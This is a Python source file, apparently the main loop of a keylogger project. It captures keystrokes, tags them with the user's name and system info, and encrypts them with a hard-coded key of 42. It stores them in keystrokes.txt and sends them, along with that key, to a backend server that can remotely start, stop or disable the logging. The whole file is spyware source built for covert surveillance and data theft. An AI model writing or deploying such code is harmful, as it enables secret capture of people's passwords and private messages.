import time
import socket
import sys
from logger import KeyLoggerService
from writer import FileWriter
from sender import NetworkWriter
from encryption import Encryptor
import base64
from systeminfo import get_system_info
from backend_notifier import BackendNotifier
def merge(a,b):
    c = {}
    for key in a | b:
        c[key] = list(a.get(key, []) + b.get(key, []))
    return c

def main():
    backendurl = "http://127.0.0.1:5000"
    service = KeyLoggerService()                                                     # start and stop logging service
    writer = FileWriter(filename="keystrokes.txt")                                   # write the keystrokes locally
    sender = NetworkWriter(server_url=backendurl)                                    # send the encoded data
    # Key must be a string or an integer!!!!
    encryption_key = 42
    encryptor = Encryptor(key=encryption_key)                                         # choose the encryption key
    Systeminfo = get_system_info()
    backend_notifier = BackendNotifier(backendurl)                                    # Notifies the server that the script is running
                                                                                      # and checks whether to start or stop


    buffer = {}
    backend_notifier.im_alive()                                                      # notify the backend the script is ready to start
    try:
        while True:
            if backend_notifier.disabled():
                service.stop_logging()
                sys.exit()
            status = backend_notifier.start_or_stop()                                # check if approval is granted or denied
            if status:
                print("im running")
                service.start_logging()
                time.sleep(10)                                                       # Choose here how many seconds to wait between sending
                keys = service.get_logged_keys()
                if keys:
                    buffer = merge(buffer,keys)

                if buffer:
                    data = " | ".join(f"{k}: {''.join(v)}" for k, v in buffer.items())
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    data = f"[{timestamp}] \n [user name: {Systeminfo['username']}] \n{data}"
                    encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
                    encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending

                    writer.write_data(encrypted_b64)                                   # write locally encoded data
                    sender.send_data(encrypted_b64,Systeminfo,encryption_key)          # send the encoded data to backend

                    buffer = {}                                                        # clear the buffer
            else:
                print("im stopping")
                service.stop_logging()
            time.sleep(10)                                                         # Choose here how many seconds to wait between
                                                                                   # checks if approval is granted or denied

    except KeyboardInterrupt:
        if buffer:
            data = " | ".join(f"{k}: {', '.join(v)}" for k, v in buffer.items())
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            data = f"[{timestamp}] \n [user name: {Systeminfo['username']}] \n{data}"
            encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending

            writer.write_data(encrypted_b64)
            sender.send_data(encrypted_b64, Systeminfo, encryption_key)

if __name__ == "__main__":
    main()